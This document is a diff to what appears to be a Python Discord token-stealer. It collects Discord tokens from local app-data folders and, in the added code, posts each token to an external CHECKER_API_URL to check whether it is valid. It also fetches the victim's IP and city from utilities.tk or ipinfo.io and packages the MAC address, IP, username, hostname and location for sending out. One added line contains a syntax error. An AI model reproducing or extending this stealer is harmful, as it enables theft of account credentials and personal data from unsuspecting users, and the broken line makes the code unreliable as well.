@@ -12,8 +12,12 @@ try:
     LOCAL = os.getenv("LOCALAPPDATA")
     ROAMING = os.getenv("APPDATA")
     TEMP = os.getenv("TEMP")
-    res = requests.get("https://ipinfo.io")
-    data = res.json()
+    try:
+        data = requests.get("https://utilities.tk/network/info").json()
+        global ipaddr
+        ipaddr = data['ip']
+    except:
+        data = requests.get("https://ipinfo.io/json").json()
 except:
     pass
 
@@ -42,7 +46,17 @@ def getheaders(token=None):
     return headers
 def getuserdata(token):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
+        r = post(CHECKER_API_URL, json={'token':token})
+        if r.status_code == 200:
+            return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
+        elif r.status_code == 429:
+            return " Error"
+        elif r.status_code == 401:
+            return " Invalid"
+        elif r.status_code == 403:
+            return f" Locked - '{r.json()['username']}'"
+        else:
+            return " Error"
     except:
         pass
 def gettokens(path):
@@ -127,7 +141,7 @@ def main():
                     },
                     {
                         "name": "𝘊𝘖𝘔𝘗𝘜𝘛𝘌𝘙",
-                        "value": f'MAC : {(gma()).replace(":", "-").upper()}\nIP: {requests.get("https://api.ipify.org").text}\nUsername : {os.getenv("UserName")}\nHostname : {os.getenv("COMPUTERNAME")}\nLocation : {platform}\nVille : {data["city"]}',
+                        "value": f'MAC : {(gma()).replace(":", "-").upper()}\nIP: {ipaddr).text}\nUsername : {os.getenv("UserName")}\nHostname : {os.getenv("COMPUTERNAME")}\nLocation : {platform}\nVille : {data["city"]}',
                         "inline": True
                     },
                     {
